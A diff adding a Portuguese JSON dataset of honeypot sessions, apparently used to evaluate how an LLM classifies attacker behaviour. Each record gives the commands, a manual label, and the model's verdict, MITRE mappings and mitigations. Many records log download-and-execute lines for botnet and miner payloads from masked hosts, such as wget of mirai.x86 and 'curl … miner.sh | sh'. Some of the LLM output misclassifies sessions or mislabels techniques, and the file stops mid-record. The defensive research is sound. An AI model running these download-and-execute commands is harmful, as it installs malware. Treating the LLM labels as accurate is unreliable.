@@ -1,0 +1,1472 @@
+[
+  {
+    "ordem": 1,
+    "session_id": "l2_real_01_f91d83b42a11",
+    "data_coleta": "2026-09-27",
+    "src_ip_mascarado_rfc5737": "198.51.100.200",
+    "comandos": [
+      "id",
+      "uname -a",
+      "cat /etc/issue",
+      "ls -la /tmp",
+      "cat /proc/cpuinfo",
+      "crontab -l"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 1.53,
+    "resposta_crua_llm": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor executou comandos de enumeração manual do sistema operacional, incluindo checagem de privilégios (id), versão do kernel (uname -a), distribuição (cat /etc/issue), arquivos temporários (ls -la /tmp), informações de hardware (cat /proc/cpuinfo) e tarefas agendadas (crontab -l), típico de reconhecimento pós-exploração.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a, cat /etc/issue, cat /proc/cpuinfo"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /tmp"
+        },
+        {
+          "tactic": "Execution",
+          "technique_id": "T1053",
+          "technique_name": "Scheduled Task/Job",
+          "evidence": "crontab -l"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.200 -j DROP",
+        "passwd -l root",
+        "last -a"
+      ],
+      "session_id": "l2_real_01_f91d83b42a11",
+      "src_ip": "198.51.100.200",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.53,
+      "comandos": [
+        "id",
+        "uname -a",
+        "cat /etc/issue",
+        "ls -la /tmp",
+        "cat /proc/cpuinfo",
+        "crontab -l"
+      ]
+    }
+  },
+  {
+    "ordem": 2,
+    "session_id": "l2_real_02_8a2c4109e112",
+    "data_coleta": "2026-09-28",
+    "src_ip_mascarado_rfc5737": "192.0.2.11",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.11/bins/mirai.x86",
+      "chmod 777 mirai.x86",
+      "./mirai.x86"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 3.16,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O ator malicioso acessou o diretório temporário, baixou um binário de malware Mirai via wget, concedeu permissões de execução e executou o binário para infecção.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "./mirai.x86"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.11/bins/mirai.x86"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.11 -j DROP",
+        "killall mirai.x86",
+        "rm -f /tmp/mirai.x86"
+      ],
+      "session_id": "l2_real_02_8a2c4109e112",
+      "src_ip": "192.0.2.11",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 3.16,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.11/bins/mirai.x86",
+        "chmod 777 mirai.x86",
+        "./mirai.x86"
+      ]
+    }
+  },
+  {
+    "ordem": 3,
+    "session_id": "l2_real_03_3b7e9201c405",
+    "data_coleta": "2026-09-29",
+    "src_ip_mascarado_rfc5737": "192.0.2.12",
+    "comandos": [
+      "cd /var/tmp",
+      "curl -O http://192.0.2.12/d.sh",
+      "sh d.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.24,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor utilizou comandos automatizados para acessar o diretório temporário, baixar um script externo via curl e executá-lo imediatamente, comportamento típico de infecção por malware ou minerador.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh d.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://192.0.2.12/d.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.12 -j DROP",
+        "rm -f /var/tmp/d.sh"
+      ],
+      "session_id": "l2_real_03_3b7e9201c405",
+      "src_ip": "192.0.2.12",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.24,
+      "comandos": [
+        "cd /var/tmp",
+        "curl -O http://192.0.2.12/d.sh",
+        "sh d.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 4,
+    "session_id": "l2_real_04_5c1a8304f219",
+    "data_coleta": "2026-09-30",
+    "src_ip_mascarado_rfc5737": "192.0.2.13",
+    "comandos": [
+      "uname -a",
+      "cat /proc/cpuinfo | grep model",
+      "free -m"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.12,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Execução rápida e automatizada de comandos de reconhecimento de sistema para coletar informações sobre o kernel, CPU e memória.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a, cat /proc/cpuinfo, free -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.13 -j DROP"
+      ],
+      "session_id": "l2_real_04_5c1a8304f219",
+      "src_ip": "192.0.2.13",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.12,
+      "comandos": [
+        "uname -a",
+        "cat /proc/cpuinfo | grep model",
+        "free -m"
+      ]
+    }
+  },
+  {
+    "ordem": 5,
+    "session_id": "l2_real_05_9d4f1028b307",
+    "data_coleta": "2026-10-01",
+    "src_ip_mascarado_rfc5737": "192.0.2.14",
+    "comandos": [
+      "cd /tmp || cd /var/run",
+      "wget http://192.0.2.14/sora.sh",
+      "chmod 777 sora.sh",
+      "sh sora.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.4,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um script malicioso via wget, alterou suas permissões para execução e o executou imediatamente, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh sora.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.14/sora.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.14 -j DROP",
+        "rm -f /tmp/sora.sh /var/run/sora.sh"
+      ],
+      "session_id": "l2_real_05_9d4f1028b307",
+      "src_ip": "192.0.2.14",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.4,
+      "comandos": [
+        "cd /tmp || cd /var/run",
+        "wget http://192.0.2.14/sora.sh",
+        "chmod 777 sora.sh",
+        "sh sora.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 6,
+    "session_id": "l2_real_06_2e8b5017a921",
+    "data_coleta": "2026-10-02",
+    "src_ip_mascarado_rfc5737": "192.0.2.15",
+    "comandos": [
+      "cd /tmp",
+      "wget -q http://192.0.2.15/xmrig",
+      "chmod +x xmrig",
+      "./xmrig"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 3.33,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download direto, alteração de permissão e execução de um minerador de criptomoedas (XMRig) a partir do diretório temporário.",
+      "mitre_attack": [
+        {
+          "tactic": "Resource Development",
+          "technique_id": "T1588.002",
+          "technique_name": "Obtain Capabilities: Tool",
+          "evidence": "wget -q http://192.0.2.15/xmrig"
+        },
+        {
+          "tactic": "Impact",
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "evidence": "./xmrig"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.15 -j DROP",
+        "pkill -f xmrig",
+        "rm -f /tmp/xmrig"
+      ],
+      "session_id": "l2_real_06_2e8b5017a921",
+      "src_ip": "192.0.2.15",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 3.33,
+      "comandos": [
+        "cd /tmp",
+        "wget -q http://192.0.2.15/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ]
+    }
+  },
+  {
+    "ordem": 7,
+    "session_id": "l2_real_07_7f3c6092d104",
+    "data_coleta": "2026-10-03",
+    "src_ip_mascarado_rfc5737": "192.0.2.16",
+    "comandos": [
+      "cat /proc/cpuinfo",
+      "lscpu",
+      "uname -m"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.3,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor executou comandos para enumeração de hardware e arquitetura do sistema logo após o acesso inicial, comportamento típico de scripts de reconhecimento automatizados (como preparativos para instalação de mineradores).",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo, lscpu, uname -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.16 -j DROP",
+        "passwd -l root"
+      ],
+      "session_id": "l2_real_07_7f3c6092d104",
+      "src_ip": "192.0.2.16",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.3,
+      "comandos": [
+        "cat /proc/cpuinfo",
+        "lscpu",
+        "uname -m"
+      ]
+    }
+  },
+  {
+    "ordem": 8,
+    "session_id": "l2_real_08_1a9d4083e516",
+    "data_coleta": "2026-10-04",
+    "src_ip_mascarado_rfc5737": "192.0.2.17",
+    "comandos": [
+      "cd /dev/shm",
+      "curl -s http://192.0.2.17/bot.py -o bot.py",
+      "python3 bot.py"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.36,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário /dev/shm, baixou um script de botnet via curl e o executou imediatamente utilizando o interpretador python3, caracterizando uma infecção automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.006",
+          "technique_name": "Command and Scripting Interpreter: Python",
+          "evidence": "python3 bot.py"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -s http://192.0.2.17/bot.py -o bot.py"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.17 -j DROP",
+        "rm -f /dev/shm/bot.py",
+        "pkill -f bot.py"
+      ],
+      "session_id": "l2_real_08_1a9d4083e516",
+      "src_ip": "192.0.2.17",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.36,
+      "comandos": [
+        "cd /dev/shm",
+        "curl -s http://192.0.2.17/bot.py -o bot.py",
+        "python3 bot.py"
+      ]
+    }
+  },
+  {
+    "ordem": 9,
+    "session_id": "l2_real_09_4b2e7031c809",
+    "data_coleta": "2026-10-05",
+    "src_ip_mascarado_rfc5737": "192.0.2.18",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.18/arm7",
+      "chmod +x arm7",
+      "./arm7"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.32,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download de um binário malicioso para arquitetura ARM diretamente para o diretório temporário, alterou suas permissões para execução e o executou imediatamente, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "./arm7"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.18/arm7"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.18 -j DROP",
+        "rm -f /tmp/arm7",
+        "pkill -f arm7"
+      ],
+      "session_id": "l2_real_09_4b2e7031c809",
+      "src_ip": "192.0.2.18",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.32,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.18/arm7",
+        "chmod +x arm7",
+        "./arm7"
+      ]
+    }
+  },
+  {
+    "ordem": 10,
+    "session_id": "l2_real_10_6c5f8014b223",
+    "data_coleta": "2026-10-06",
+    "src_ip_mascarado_rfc5737": "192.0.2.19",
+    "comandos": [
+      "uname -s -v -n -r -m",
+      "cat /proc/mounts"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.03,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Coleta automatizada de informações do sistema operacional e pontos de montagem logo após o acesso inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.19 -j DROP"
+      ],
+      "session_id": "l2_real_10_6c5f8014b223",
+      "src_ip": "192.0.2.19",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.03,
+      "comandos": [
+        "uname -s -v -n -r -m",
+        "cat /proc/mounts"
+      ]
+    }
+  },
+  {
+    "ordem": 11,
+    "session_id": "l2_real_11_8d1a9047f612",
+    "data_coleta": "2026-10-07",
+    "src_ip_mascarado_rfc5737": "192.0.2.20",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.20/Mozi.m",
+      "chmod 777 Mozi.m",
+      "./Mozi.m"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.33,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou o download direto de um payload de malware conhecido (Mozi botnet) para o diretório /tmp, alterou suas permissões para execução e o executou imediatamente, caracterizando uma infecção automatizada por worm/botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./Mozi.m"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.20/Mozi.m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.20 -j DROP",
+        "pkill -f Mozi.m",
+        "rm -f /tmp/Mozi.m"
+      ],
+      "session_id": "l2_real_11_8d1a9047f612",
+      "src_ip": "192.0.2.20",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.33,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.20/Mozi.m",
+        "chmod 777 Mozi.m",
+        "./Mozi.m"
+      ]
+    }
+  },
+  {
+    "ordem": 12,
+    "session_id": "l2_real_12_3e4b2059a108",
+    "data_coleta": "2026-10-08",
+    "src_ip_mascarado_rfc5737": "192.0.2.21",
+    "comandos": [
+      "cd /tmp",
+      "curl -O http://192.0.2.21/setup.sh",
+      "chmod +x setup.sh",
+      "./setup.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.6,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O atacante acessou o diretório temporário, baixou um script de configuração externo utilizando curl, concedeu permissões de execução e o executou imediatamente, comportamento típico de infecção automatizada por malware ou minerador.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "Execução do script setup.sh via shell"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://192.0.2.21/setup.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.21 -j DROP",
+        "rm -f /tmp/setup.sh"
+      ],
+      "session_id": "l2_real_12_3e4b2059a108",
+      "src_ip": "192.0.2.21",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.6,
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://192.0.2.21/setup.sh",
+        "chmod +x setup.sh",
+        "./setup.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 13,
+    "session_id": "l2_real_13_5f7c3081d419",
+    "data_coleta": "2026-10-09",
+    "src_ip_mascarado_rfc5737": "192.0.2.22",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.22/arm5",
+      "chmod 777 arm5",
+      "./arm5"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.36,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor baixou e executou um binário malicioso para arquitetura ARM a partir de um servidor externo no diretório temporário, indicando uma infecção por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "chmod 777 arm5 && ./arm5"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.22/arm5"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.22 -j DROP",
+        "pkill -f arm5",
+        "rm -f /tmp/arm5"
+      ],
+      "session_id": "l2_real_13_5f7c3081d419",
+      "src_ip": "192.0.2.22",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.36,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.22/arm5",
+        "chmod 777 arm5",
+        "./arm5"
+      ]
+    }
+  },
+  {
+    "ordem": 14,
+    "session_id": "l2_real_14_9a2d6015e703",
+    "data_coleta": "2026-10-10",
+    "src_ip_mascarado_rfc5737": "192.0.2.23",
+    "comandos": [
+      "cd /var/tmp",
+      "wget -q http://192.0.2.23/kdevtmpfsi",
+      "chmod +x kdevtmpfsi",
+      "./kdevtmpfsi"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.99,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou o download direto e a execução de um binário malicioso conhecido (kdevtmpfsi, associado a cryptominers) no diretório temporário após navegar para ele.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./kdevtmpfsi"
+        },
+        {
+          "tactic": "Command and Control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://192.0.2.23/kdevtmpfsi"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.23 -j DROP",
+        "pkill -f kdevtmpfsi",
+        "rm -f /var/tmp/kdevtmpfsi"
+      ],
+      "session_id": "l2_real_14_9a2d6015e703",
+      "src_ip": "192.0.2.23",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.99,
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://192.0.2.23/kdevtmpfsi",
+        "chmod +x kdevtmpfsi",
+        "./kdevtmpfsi"
+      ]
+    }
+  },
+  {
+    "ordem": 15,
+    "session_id": "l2_real_15_1b8e4092c315",
+    "data_coleta": "2026-10-11",
+    "src_ip_mascarado_rfc5737": "192.0.2.24",
+    "comandos": [
+      "uname -a",
+      "echo xsec"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.15,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Sessão iniciada com comandos típicos de reconhecimento automatizado para identificação de sistema operacional e validação de acesso.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.24 -j DROP"
+      ],
+      "session_id": "l2_real_15_1b8e4092c315",
+      "src_ip": "192.0.2.24",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.15,
+      "comandos": [
+        "uname -a",
+        "echo xsec"
+      ]
+    }
+  },
+  {
+    "ordem": 16,
+    "session_id": "l2_real_16_4c3f7026b827",
+    "data_coleta": "2026-10-12",
+    "src_ip_mascarado_rfc5737": "192.0.2.25",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.25/x86_64",
+      "chmod 777 x86_64",
+      "./x86_64"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.24,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O atacante realizou o download direto de um binário malicioso a partir de um servidor externo para o diretório temporário, alterou suas permissões para execução total e o executou, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./x86_64"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.25/x86_64"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.25 -j DROP",
+        "killall -9 x86_64",
+        "rm -f /tmp/x86_64"
+      ],
+      "session_id": "l2_real_16_4c3f7026b827",
+      "src_ip": "192.0.2.25",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.24,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.25/x86_64",
+        "chmod 777 x86_64",
+        "./x86_64"
+      ]
+    }
+  },
+  {
+    "ordem": 17,
+    "session_id": "l2_real_17_7d9a1053f401",
+    "data_coleta": "2026-10-13",
+    "src_ip_mascarado_rfc5737": "192.0.2.26",
+    "comandos": [
+      "cd /tmp",
+      "curl -s http://192.0.2.26/miner.sh | sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 3.02,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download imediato e execução de um script de mineração de criptomoedas utilizando pipe para o shell a partir de um diretório temporário.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "curl -s http://192.0.2.26/miner.sh | sh"
+        },
+        {
+          "tactic": "Resource Development",
+          "technique_id": "T1587.001",
+          "technique_name": "Develop Capabilities: Malware",
+          "evidence": "miner.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.26 -j DROP",
+        "rm -f /tmp/miner.sh"
+      ],
+      "session_id": "l2_real_17_7d9a1053f401",
+      "src_ip": "192.0.2.26",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 3.02,
+      "comandos": [
+        "cd /tmp",
+        "curl -s http://192.0.2.26/miner.sh | sh"
+      ]
+    }
+  },
+  {
+    "ordem": 18,
+    "session_id": "l2_real_18_2e5b8064a914",
+    "data_coleta": "2026-10-14",
+    "src_ip_mascarado_rfc5737": "192.0.2.27",
+    "comandos": [
+      "uname -a",
+      "nproc",
+      "cat /proc/cpuinfo"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.12,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O invasor executou comandos básicos de reconhecimento do sistema (sistema operacional, número de núcleos de CPU e informações do processador), comportamento típico de scripts automatizados de sondagem inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a, nproc, cat /proc/cpuinfo"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.27 -j DROP"
+      ],
+      "session_id": "l2_real_18_2e5b8064a914",
+      "src_ip": "192.0.2.27",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.12,
+      "comandos": [
+        "uname -a",
+        "nproc",
+        "cat /proc/cpuinfo"
+      ]
+    }
+  },
+  {
+    "ordem": 19,
+    "session_id": "l2_real_19_6f1c9038d206",
+    "data_coleta": "2026-10-15",
+    "src_ip_mascarado_rfc5737": "192.0.2.28",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.28/i686",
+      "chmod +x i686",
+      "./i686"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.37,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um binário malicioso compilado para arquitetura i686 via wget, concedeu permissão de execução e executou o payload, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./i686"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.28/i686"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.28 -j DROP",
+        "rm -f /tmp/i686",
+        "pkill -f i686"
+      ],
+      "session_id": "l2_real_19_6f1c9038d206",
+      "src_ip": "192.0.2.28",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.37,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.28/i686",
+        "chmod +x i686",
+        "./i686"
+      ]
+    }
+  },
+  {
+    "ordem": 20,
+    "session_id": "l2_real_20_8a4d2071e618",
+    "data_coleta": "2026-10-16",
+    "src_ip_mascarado_rfc5737": "192.0.2.29",
+    "comandos": [
+      "cd /dev/shm",
+      "wget -q http://192.0.2.29/payload.elf",
+      "chmod +x payload.elf",
+      "./payload.elf"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.31,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
